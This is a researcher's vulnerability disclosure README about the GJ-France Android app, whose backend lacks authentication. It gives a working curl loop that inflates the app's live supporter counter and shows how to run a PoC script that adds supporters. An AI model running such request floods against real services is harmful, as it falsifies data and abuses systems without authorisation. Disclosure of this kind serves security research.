# GJ-FRANCE API vulnerability
The [GJ-France](https://play.google.com/store/apps/details?id=fr.devappfrance.gj_france) app is the "official" Android app of the Yellow vests movement in France.

As per their Google Play description, this app is presenting "the figures"
> Présentation des chiffres 
> A partir du menu "Les Chiffres", l'App présente deux types de chiffres :
> Le nombre de SOUTIENS du mouvement (actualisé en temps réél)
> Le nombre de GJ actifs terrain pour chaque jour

In the app, they called this section "The TRUE figures" aka media are lying we are more than that.

This Cordova app made by an "agency" called [Whelp](whelp.fr) has many issues. Their backend is probably one of the worst backend I saw in my life. There is no authentication mechanism, they used POST requests for everything,...

Thanks to this lack of authentication mechanism, you can increment indefinitively the live support counter with the following command:
```console
for i in {1..10}; do curl -X POST https://api.gj-france.fr/soutien; done
```
Oops, the TRUE figures are not really true anymore...

## Demo
[![Demo](http://img.youtube.com/vi/9DlDl7Epmdc/0.jpg)](http://www.youtube.com/watch?v=9DlDl7Epmdc)

## Affected Versions
1.0.8 and below

## How To
```console
# Add 200 new supporter
python poc.py 200
```

## Contact
Follow me on [Twitter](https://twitter.com/fs0c131y)! You can also find a small part of my work at [https://fs0c131y.com](https://fs0c131y.com)

## Credits
Following a tip from [@thibeault_chenu](https://twitter.com/thibeault_chenu), the investigation and the POC has been made with ❤️ by @fs0c131y